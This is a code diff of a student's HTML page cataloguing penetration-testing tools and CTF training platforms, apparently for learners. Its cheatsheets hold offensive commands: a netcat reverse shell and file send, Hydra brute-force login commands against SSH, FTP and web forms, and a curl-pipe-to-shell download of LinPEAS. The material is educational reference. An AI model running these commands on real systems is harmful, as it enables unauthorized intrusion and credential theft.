+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">The "TCP/IP Swiss Army Knife" — reads and writes raw TCP/UDP connections. Used to set up reverse shell listeners, transfer files, port scan, create backdoors, and even chat. An absolute fundamental for both CTF challenges and real pentesting. Built-in on most Unix systems.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Common Usage</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">nc -lvnp 4444              # listener
+nc target.com 4444         # connect
+nc -e /bin/bash ip 4444    # reverse shell
+nc ip 4444 < file.txt      # file send
+nc -lvnp 4444 > recv.txt   # file receive</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://nmap.org/ncat/" target="_blank">nmap.org/ncat</a>
+            <div class="card-badges"><span class="badge badge-free">BUILT-IN</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="hydra brute force password login ssh ftp rdp">
+        <div class="card-accent acc-red"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">Hydra</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">Fast, parallelized login cracker supporting 50+ protocols: SSH, FTP, HTTP, RDP, SMB, SMTP, Telnet, and more. Used to test whether accounts are protected by weak or default credentials. Critical for network pentests and CTF challenges involving service authentication.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Common Commands</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code">hydra -l admin -P passlist.txt ssh://target
+hydra -L users.txt -P pass.txt ftp://target
+hydra -l admin -P list.txt target http-post-form \
+  "/login:user=^USER^&pass=^PASS^:F=failed"
+hydra -t 4 -l root -P list.txt target ssh</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://github.com/vanhauser-thc/thc-hydra" target="_blank">github: thc-hydra</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tool-card" data-search="linpeas winpeas privilege escalation enumeration scripts">
+        <div class="card-accent acc-red"></div>
+        <div class="card-body">
+          <div class="card-top">
+            <div class="card-name">LinPEAS / WinPEAS</div>
+            <div class="card-badges">
+              <span class="badge badge-cli">CLI</span>
+              <span class="badge badge-free">FREE</span>
+            </div>
+          </div>
+          <p class="card-desc">Privilege Escalation Awesome Scripts — automatically enumerate hundreds of potential privilege escalation vectors after you've gained a foothold. LinPEAS covers Linux (SUID, cron, sudo, weak permissions); WinPEAS covers Windows (services, registry, credentials, tokens). Color-coded output highlights critical findings.</p>
+          <div class="cheatsheet">
+            <div class="cheatsheet-header">
+              <span class="cheatsheet-label">⌨ Quick Deployment</span>
+              <div class="cheatsheet-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+            </div>
+            <div class="cheatsheet-code"># Linux: download and run
+curl -L https://github.com/.../linpeas.sh | sh
+# or upload then:
+chmod +x linpeas.sh && ./linpeas.sh
+# Windows: 
+.\winPEASany.exe quiet
+.\winPEASany.exe systeminfo</div>
+          </div>
+          <div class="card-footer-row">
+            <a class="card-link" href="https://github.com/carlospolop/PEASS-ng" target="_blank">github: PEASS-ng</a>
+            <div class="card-badges"><span class="badge badge-free">OPEN SOURCE</span></div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ════════ NO RESULTS ════════ -->
+  <div class="no-results" id="no-results">
+    <div style="font-size:2rem;margin-bottom:1rem;">⌕</div>
+    No tools match your search.<br>
+    <span style="color:var(--txt3);font-size:11px;margin-top:6px;display:block;">Try a different keyword or category.</span>
+  </div>
+
+  </div><!-- end #tools -->
+
+  <!-- ════════ TRAINING PLATFORMS ════════ -->
+  <section class="section about-section" id="training">
+    <div class="section-header">
+      <div class="section-icon icon-purple">🎓</div>
+      <span class="section-title">Training &amp; Wargames Platforms</span>
+      <div class="section-line"></div>
+    </div>
+    <div class="platforms-grid">
+
+      <a class="platform-card plat-green" href="https://secplayground.io" target="_blank" data-search="secplayground practice lab training web security">
+        <div class="platform-icon">🛡</div>
+        <div class="platform-name">SECPlayground</div>
+        <p class="platform-desc">Hands-on cybersecurity lab environment for practicing real-world attacks and defenses. Structured learning paths covering web security, network attacks, and more.</p>
+        <div class="platform-tag">// HANDS-ON LABS · STRUCTURED PATHS</div>
+      </a>
+
+      <a class="platform-card plat-amber" href="https://overthewire.org/wargames/bandit" target="_blank" data-search="overthewire bandit wargame linux beginner bash ssh">
+        <div class="platform-icon">🔱</div>
+        <div class="platform-name">OverTheWire — Bandit</div>
+        <p class="platform-desc">The perfect starting wargame for absolute beginners. Learn Linux fundamentals, bash, SSH, file permissions, and basic command-line skills by solving progressive challenges via SSH.</p>
+        <div class="platform-tag">// LINUX FUNDAMENTALS · SSH · BEGINNER</div>
+      </a>
+
+      <a class="platform-card plat-blue" href="https://picoctf.org" target="_blank" data-search="picoctf ctf beginner competition carnegie mellon">
+        <div class="platform-icon">🚩</div>
+        <div class="platform-name">picoCTF</div>
+        <p class="platform-desc">Carnegie Mellon's free educational CTF platform. Thousands of challenges spanning web, crypto, forensics, binary exploitation, and reverse engineering — from beginner to advanced, always available.</p>
+        <div class="platform-tag">// CTF CHALLENGES · ALL LEVELS · FREE</div>
+      </a>
+
+      <a class="platform-card plat-red" href="https://hackthebox.com" target="_blank" data-search="hackthebox htb machines active retired pentest practice">
+        <div class="platform-icon">⬡</div>
+        <div class="platform-name">HackTheBox</div>
+        <p class="platform-desc">The industry-leading penetration testing practice platform. Hack realistic vulnerable machines, complete Pro Labs (enterprise network simulations), and earn rankings. Widely recognized by employers in the security industry.</p>
+        <div class="platform-tag">// MACHINES · PRO LABS · INDUSTRY STANDARD</div>
+      </a>
+
+      <a class="platform-card plat-purple" href="https://tryhackme.com" target="_blank" data-search="tryhackme thm guided learning path rooms beginner">
+        <div class="platform-icon">👾</div>
+        <div class="platform-name">TryHackMe</div>
+        <p class="platform-desc">Browser-based learning with guided "rooms" that walk you through concepts step by step. Great for beginners — no setup required, just deploy a room and start hacking. Covers pre-security, web fundamentals, SOC, and red teaming paths.</p>
+        <div class="platform-tag">// GUIDED ROOMS · BROWSER-BASED · BEGINNER</div>
+      </a>
+
+      <a class="platform-card plat-blue" href="https://ctftime.org" target="_blank" data-search="ctftime ctf calendar competition ranking teams events">
+        <div class="platform-icon">📅</div>
+        <div class="platform-name">CTFtime</div>
+        <p class="platform-desc">The global CTF competition calendar and ranking aggregator. Find upcoming CTF events worldwide, see team rankings, browse write-ups from past competitions, and track your CTF history. Essential for the competitive CTF community.</p>
+        <div class="platform-tag">// CTF CALENDAR · RANKINGS · WRITE-UPS</div>
+      </a>
+
+    </div>
+  </section>
+
+  <!-- ════════ ABOUT / PORTFOLIO ════════ -->
+  <section class="section about-section" id="about">
+    <div class="section-header">
+      <div class="section-icon icon-green">👤</div>
+      <span class="section-title">About the Creator</span>
+      <div class="section-line"></div>
+    </div>
+    <div class="about-card">
+      <div class="about-avatar-wrap">
+        <div class="about-avatar">🛡</div>
+        <div class="about-handle">@sinxularity</div>
+      </div>
+      <div class="about-content">
+        <div class="about-name">Sinxularity</div>
+        <div class="about-title-tag">// CYBERSECURITY STUDENT &amp; CTF PLAYER</div>
+        <p class="about-bio">
+          Passionate cybersecurity student specializing in penetration testing, CTF challenges, and offensive security research. I built this directory to centralize the tools and resources I rely on daily — and to help others navigate the overwhelming landscape of security tooling more quickly.
+        </p>
+        <div class="achievements">
+          <div class="achievement">
+            <span class="achievement-badge ach-gold">🥇 FINALIST</span>
+            NCSA AI CTF — National-level AI-focused Capture The Flag competition finalist
+          </div>
+          <div class="achievement">
+            <span class="achievement-badge ach-green">✓ COMPLETED</span>
+            Basic Cybersecurity Lab — Hands-on practical security fundamentals certification
+          </div>
+          <div class="achievement">
+            <span class="achievement-badge ach-blue">🚩 ACTIVE</span>
+            Competitive CTF player — HackTheBox, picoCTF, TryHackMe
+          </div>
+        </div>
+        <div class="about-skills">
+          <span class="skill-pill">Penetration Testing</span>
+          <span class="skill-pill">Web Security</span>
+          <span class="skill-pill">CTF / Wargames</span>
+          <span class="skill-pill">OSINT</span>
+          <span class="skill-pill">Reverse Engineering</span>
+          <span class="skill-pill">Python</span>
+          <span class="skill-pill">Linux</span>
+          <span class="skill-pill">AI in Security</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</div><!-- end .page-wrap -->
+
+<!-- ════════ FOOTER ════════ -->
+<footer>
+  <div class="footer-inner">
+    <div class="footer-disclaimer">
+      ⚠ Disclaimer: All tools and information are provided for Educational Purposes Only. Always obtain proper authorization before testing any system.
+    </div>
+    <div class="footer-copy">
+      Built by <a href="#about">Sinxularity</a> · CyberSec Tools Directory · 2025 &nbsp;·&nbsp; <span style="color:var(--txt3)">Use responsibly.</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+/* ─── THEME TOGGLE ─── */
+const html = document.documentElement;
+const themeBtn = document.getElementById('theme-toggle');
+let isDark = true;
+
+function setTheme(dark) {
+  isDark = dark;
+  html.setAttribute('data-theme', dark ? 'dark' : 'light');
+  themeBtn.textContent = dark ? '🌙' : '☀️';
+  localStorage.setItem('theme', dark ? 'dark' : 'light');
 }
 
-function setFilter(f) {
-  currentFilter = f;
-  setFilterUI(f, currentTeam);
+// Load saved preference
+const saved = localStorage.getItem('theme');
+if (saved) setTheme(saved === 'dark');
 
-  const secInstall = document.getElementById('sec-install');
-  const secBrowser = document.getElementById('sec-browser');
+themeBtn.addEventListener('click', () => setTheme(!isDark));
 
-  if(f === 'all') {
-    secInstall.classList.remove('hidden');
-    secBrowser.classList.remove('hidden');
-  } else if(f === 'install') {
-    secInstall.classList.remove('hidden');
-    secBrowser.classList.add('hidden');
+/* ─── UNIFIED SEARCH ─── */
+const searchMain = document.getElementById('search-main');
+const searchNav = document.getElementById('nav-search');
+const resultCount = document.getElementById('result-count');
+const noResults = document.getElementById('no-results');
+
+const allCards = document.querySelectorAll('.tool-card, .platform-card');
+const allSections = document.querySelectorAll('.section[data-section]');
+
+function doSearch(query) {
+  const q = query.toLowerCase().trim();
+
+  // Sync both inputs
+  if (searchMain.value !== query) searchMain.value = query;
+  if (searchNav.value !== query) searchNav.value = query;
+
+  let visible = 0;
+
+  allCards.forEach(card => {
+    const text = (card.dataset.search || '') + ' ' + (card.textContent || '');
+    const match = !q || text.toLowerCase().includes(q);
+    card.classList.toggle('hidden-by-search', !match);
+    if (match) visible++;
+  });
+
+  // Hide/show sections based on whether any cards are visible
+  allSections.forEach(sec => {
+    const hasVisible = [...sec.querySelectorAll('.tool-card, .platform-card')]
+      .some(c => !c.classList.contains('hidden-by-search'));
+    sec.style.display = hasVisible ? '' : 'none';
+  });
+
+  // Update count
+  if (q) {
+    resultCount.textContent = `${visible} result${visible !== 1 ? 's' : ''} for "${query}"`;
+    resultCount.style.color = visible === 0 ? 'var(--red)' : 'var(--green)';
   } else {
-    secInstall.classList.add('hidden');
-    secBrowser.classList.remove('hidden');
+    resultCount.textContent = '';
   }
 
-  updateCount();
+  noResults.classList.toggle('visible', visible === 0 && q.length > 0);
 }
 
-function setFilterUI(f, team) {
-  const onClass = team === 'red' ? 'on-r' : 'on-b';
-  ['flt-all','flt-install','flt-browser'].forEach(id => {
-    const el = document.getElementById(id);
-    el.className = 'flt-btn';
-  });
-  const map = { all: 'flt-all', install: 'flt-install', browser: 'flt-browser' };
-  document.getElementById(map[f]).classList.add(onClass);
-}
+searchMain.addEventListener('input', e => doSearch(e.target.value));
+searchNav.addEventListener('input', e => doSearch(e.target.value));
 
-function updateCount() {
-  const data = DATA[currentTeam];
-  let count = 0;
-  if(currentFilter === 'all') count = data.install.length + data.browser.length;
-  else if(currentFilter === 'install') count = data.install.length;
-  else count = data.browser.length;
-  document.getElementById('tools-count').textContent = `แสดง ${count} tools`;
-}
+// Clear search on Escape
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') doSearch('');
+});
 
-function goBack() {
-  document.getElementById('tools-screen').style.display = 'none';
-  document.getElementById('scroll-arrow').classList.remove('visible');
-  window.scrollTo({ top: 0, behavior: 'smooth' });
-}
+/* ─── UPDATE TOOL COUNT ─── */
+document.getElementById('stat-tools').textContent =
+  document.querySelectorAll('.tool-card').length + '+';
 </script>
 </body>
 </html>
